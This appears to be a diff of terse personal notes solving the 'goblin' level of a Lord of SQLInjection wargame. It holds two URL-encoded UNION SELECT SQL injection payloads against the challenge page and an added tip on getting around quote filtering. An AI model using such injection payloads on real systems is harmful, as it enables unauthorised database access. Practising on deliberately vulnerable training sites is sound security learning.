@@ -4,3 +4,5 @@
 no answer: https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=123UNION%20select%20id%20from%20prob_goblin%20where%20id=%27admin%27%20or%20%271%27=%271%27%20--%20test
 
 https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=1%20union%20select%20id%20from%20prob_goblin%20where%20id=%27admin%27%20and%20no=2
+
+tip: Detour quotes // Make Failure // string detour
